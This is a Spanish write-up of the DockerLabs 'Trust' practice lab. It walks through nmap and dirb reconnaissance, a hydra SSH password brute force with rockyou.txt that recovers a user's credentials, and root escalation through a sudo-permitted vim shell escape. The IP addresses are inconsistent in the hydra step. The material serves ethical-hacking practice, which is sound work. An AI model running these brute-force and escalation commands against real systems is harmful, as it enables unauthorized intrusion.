---
title: Trust
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-03
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-trust/trust_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - fuzzing_web
  - password_attacks
  - sudo_abuse
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/trust:-$ ping -c 1 127.18.0.2
PING 127.18.0.2 (127.18.0.2) 56(84) bytes of data.
64 bytes from 127.18.0.2: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.18.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos. 

```terminal
/home/kali/Documents/dockerlabs/trust:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv -oG nmap1.2 127.18.0.2
Host: 127.18.0.2 ()     Status: Up
Host: 127.18.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/trust:-$ sudo nmap -sCV -p22,80 -vvv -oN nmap2 127.18.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHjaznpuQYsT/kxLXSVDFJGTtesV6UrUh5aNJhw+tAdr19MnZpuY/8e0gb+NXRebo5Dcv/DP1H+aLFHaS6+XCGw=
|   256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJW/dREGeklk/wsHXisOmbmVwP9zg7U8xS+OfHkxLF0Z
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/trust:-$ whatweb 127.18.0.2
http://127.18.0.2 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[127.18.0.2], Title[Apache2 Debian Default Page: It works]
```

---
## Web Analysis

La página web inicial parece ser una plantilla predeterminada de Apache.

![](assets/img/dockerlabs-writeup-trust/trust1.png)

Durante el proceso de fuzzing, encuentro una pagina PHP accesible, ```secret.php```.

```terminal
/home/kali/Documents/dockerlabs/trust:-$ dirb http://127.18.0.2 -X .html,.conf,.txt,.php,.md
---- Scanning URL: http://127.18.0.2/ ----
+ http://127.18.0.2/index.html (CODE:200|SIZE:10701)
+ http://127.18.0.2/secret.php (CODE:200|SIZE:927)
```

![](assets/img/dockerlabs-writeup-trust/trust2.png)

---
## Vulnerability Exploitation

En este punto, decido realizar un ataque de fuerza bruta al servicio SSH utilizando ```mario``` como nombre de usuario.

```terminal
/home/kali/Documents/dockerlabs/trust:-$ sudo hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 10 -I
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
```

![](assets/img/dockerlabs-writeup-trust/trust3.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/trust:-$ ssh mario@127.18.0.2
mario@127.18.0.2's password: chocolate

mario@kali:~$ whoami
mario
```

---
## Privilege Escalation

```terminal
mario@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
mario:x:1000:1000:mario,,,:/home/mario:/bin/bash
```

El usuario ```mario``` puede ejecutar el comando ```/usr/bin/vim``` como cualquier usuario.

```terminal
mario@kali:~$ sudo -l
[sudo] password for mario: chocolate

Matching Defaults entries for mario on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on kali:
    (ALL) /usr/bin/vim
```

Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo), encuentro que vim puede ser utilizado para ejecutar una shell con privilegios elevados cuando se invoca con sudo.

![](assets/img/dockerlabs-writeup-trust/trust4.png)

```terminal
mario@kali:~$ sudo /usr/bin/vim -c ':!/bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
```

